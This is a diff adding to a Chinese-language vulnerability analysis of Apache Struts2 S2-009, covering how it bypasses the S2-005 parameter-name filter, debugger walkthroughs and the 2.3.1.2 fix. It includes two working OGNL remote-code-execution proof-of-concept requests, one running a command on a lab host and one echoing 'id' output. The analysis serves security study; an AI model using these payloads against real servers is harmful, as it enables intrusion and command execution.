@@ -445,7 +445,6 @@ TextFieldTag#doEndTag()
 
 <img src="pic/struts2_s2-007_11.png">
 
-
 ## 漏洞修复
 
 Struts2 `2.2.3.1`版本，依赖的XWork的版本也是`2.2.3.1`，在默认拦截器`org.apache.struts2.interceptor.StrutsConversionErrorInterceptor`的`getOverrideExpr()`方法中进行了修复。
@@ -473,16 +472,83 @@ Struts2 `2.2.3.1`版本，依赖的XWork的版本也是`2.2.3.1`，在默认拦�
 <a name="s2-009"></a>
 ## S2-009
 
+官方漏洞公告：
+https://cwiki.apache.org/confluence/display/WW/S2-009
+
+影响版本：Struts 2.0.0 - Struts 2.3.1.1
+
 ## 漏洞复现与分析
 
+`S2-009`是`S2-005`的修复绕过，而且绕过的方法很巧妙。(btw,`S2-003`/`S2-005`/`S2-009`都是当时Google安全团队的`Meder Kydyraliev`报告的)
 
+>在调试分析这些老漏洞的过程，其实也是在观摩安全人员和开发人员之间的对抗过程，挺有趣的)
+
+前面分析过`S2-003`/`S2-005`漏洞可以知道，现在为了防止请求参数名中的OGNL表达式执行，主要做了以下两点：
+- 添加了类`SecurityMemberAccess`，且其属性`allowStaticMethodAccess`默认为`false`，来防止利用OGNL表达式去执行Java方法；
+- 在拦截器`ParametersInterceptor`中对请求参数名进行正则表达式白名单字符的匹配，来防止特殊符号(比如：`#`符号)经过unicode编码后的绕过。
+
+这次的绕过使用到了OGNL表达式求值的另一种写法：`[(ognl_java_code)(fuck)]`。测试了一下，这种写法确实是有效的，如下图：
+
+<img src="pic/struts2_s2-009_1.png">
+
+另外，在Action以属性封装的形式接收表单数据的情况下，比如`myaction?testparam=xxx&z[(testparam)(fuck)]`，且`myaction`对应的Action类也有名为`testparam`的成员属性。提交后，struts2会将`xxx`赋值给Action的成员属性`testparam`，接着处理第二个参数`z[(testparam)(fuck)]`时，先在Action类中检索名为`testparam`的属性的值，将检索到的值进行OGNL表达式计算。最关键的是，`z[(testparam)(fuck)]`这种参数名形式是匹配`ParametersInterceptor`拦截器中用来校验参数名合法性的正则表达式`[a-zA-Z0-9\.\]\[\(\)_']+`的。
+
+因此，把恶意的OGNL表达式放置在`testparam`参数值，即`xxx`的位置，便可以规避拦截器`ParametersInterceptor`的正则表达式白名单字符的匹配，最终达成RCE。
+
+下面以Struts2 `2.3.1.1`自带的示例程序`showcase`为例，找到`ajax/Example5Action.java`，其代码很简单，且符合使用属性封装的形式来获取提交过来的表单数据(这里的表单，不要狭隘地理解为HTML中的`form`表单，而是通过http提交数据的一种形式：`key=value`)，如下图：
+
+<img src="pic/struts2_s2-009_2.png">
+
+构造可简单执行命令的PoC如下：
+```
+http://vulfocus.me:31519/S2-009/ajax/example5?
+name=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('touch%20/tmp/success2'))
+&z[(name)(fuck)]
+```
+
+如下图，在拦截器`ParametersInterceptor`处理完第一个请求参数`name`后，`Example5Action`的成员属性`name`被成功赋值，它的值就是我们提交的包含恶意Java代码的OGNL表达式。
+
+<img src="pic/struts2_s2-009_3.png">
+
+在解析第二个参数`z[(name)(fuck)]`的过程中，会解析为两个`ASTProperty`类型的节点，如下图：
+
+<img src="pic/struts2_s2-009_4.png">
+
+然后会去当前Action对象`Example5Action`中检索`name`成员变量的值，如下图：
+
+<img src="pic/struts2_s2-009_5.png">
+
+接着对获取到的`name`的值进行OGNL表达式计算，最后成功执行命令，如下图：
+
+<img src="pic/struts2_s2-009_6.png">
+
+<img src="pic/struts2_s2-009_7.png">
 
 ### 可回显PoC
 
+```
+/example5.action?name=(#_memberAccess.allowStaticMethodAccess=true,
+#context['xwork.MethodAccessor.denyMethodExecution']=false,
+#ret=@java.lang.Runtime@getRuntime().exec('id'),
+#br=new java.io.BufferedReader(new java.io.InputStreamReader(#ret.getInputStream())),
+#res=new char[20000],
+#br.read(#res),
+#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
+#writer.println(new java.lang.String(#res)),
+#writer.flush(),
+#writer.close())
+&z[(name)(fuck)]
+```
 
+<img src="pic/struts2_s2-009_9.png">
 
 ## 漏洞修复
 
+Struts2 `2.3.1.2`版本，依赖的XWork版本也是`2.3.1.2`，在拦截器`ParametersInterceptor`中，对请求参数名的合法性校验进行了增强，即增强了正则表达式。
+
+<img src="pic/struts2_s2-009_10.png">
+
+另外，还将`ParametersInterceptor`中的`newStack.setValue()`替换为`newStack.setParameter()`方法调用，在`OgnlValueStack#setParameter()`方法中，会通过`boolean`标志位去禁止OGNL表达式计算的。
 
 <a name="s2-012"></a>
 ## S2-012
